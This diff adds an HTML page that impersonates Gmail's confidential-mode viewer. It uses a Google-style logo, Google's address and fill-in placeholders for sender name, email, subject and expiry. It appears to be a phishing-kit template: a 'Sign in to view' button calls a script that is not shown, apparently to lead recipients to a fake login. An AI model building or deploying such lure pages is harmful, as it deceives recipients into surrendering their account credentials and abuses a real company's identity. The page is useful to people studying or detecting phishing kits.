@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{param:sender_name} has sent you a confidential message - Gmail</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="gmail-container">
+        <header class="gmail-header">
+            <div class="gmail-logo">
+                <svg viewBox="0 0 109 80" width="109" height="80">
+                    <path fill="#4285F4" d="M94.5 0H14.5C6.5 0 0 6.5 0 14.5v51C0 73.5 6.5 80 14.5 80h80c8 0 14.5-6.5 14.5-14.5v-51C109 6.5 102.5 0 94.5 0z"/>
+                    <path fill="#E8F0FE" d="M54.5 45.5L14 14h81L54.5 45.5z"/>
+                    <path fill="#fff" d="M14 14v52l24-20.5L14 14z" opacity="0.4"/>
+                </svg>
+            </div>
+        </header>
+
+        <main class="confidential-card">
+            <div class="lock-icon">
+                <svg viewBox="0 0 24 24" width="64" height="64">
+                    <path fill="#5f6368" d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                </svg>
+            </div>
+
+            <h1 class="confidential-title">Confidential Mode</h1>
+            <p class="confidential-desc">This message was sent in confidential mode.</p>
+
+            <div class="sender-info">
+                <div class="sender-avatar">{param:sender_name}</div>
+                <div class="sender-details">
+                    <div class="sender-name">{param:sender_name}</div>
+                    <div class="sender-email">{param:sender_email}</div>
+                </div>
+            </div>
+
+            <div class="email-preview">
+                <div class="preview-header">
+                    <span class="preview-label">Subject:</span>
+                    <span class="preview-subject">{param:subject}</span>
+                </div>
+                <div class="preview-body">
+                    <p>This message contains confidential information that requires authentication to view.</p>
+                </div>
+            </div>
+
+            <div class="security-notice">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <line x1="12" y1="16" x2="12" y2="12"></line>
+                    <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                </svg>
+                <span>{param:expiration} • Forwarding and copying disabled</span>
+            </div>
+
+            <div class="action-section">
+                <button class="btn-unlock" onclick="unlockMessage()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                    </svg>
+                    Sign in to view
+                </button>
+                <p class="unlock-hint">Authentication required to access this confidential message</p>
+            </div>
+
+            <div class="learn-more">
+                <a href="#">Learn more about Gmail confidential mode</a>
+            </div>
+        </main>
+
+        <footer class="gmail-footer">
+            <p>Google LLC 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</p>
+            <p>You have received this email because {param:sender_name} sent a confidential message to you.</p>
+        </footer>
+    </div>
+
+    <script src="js/main.js"></script>
+</body>
+</html>
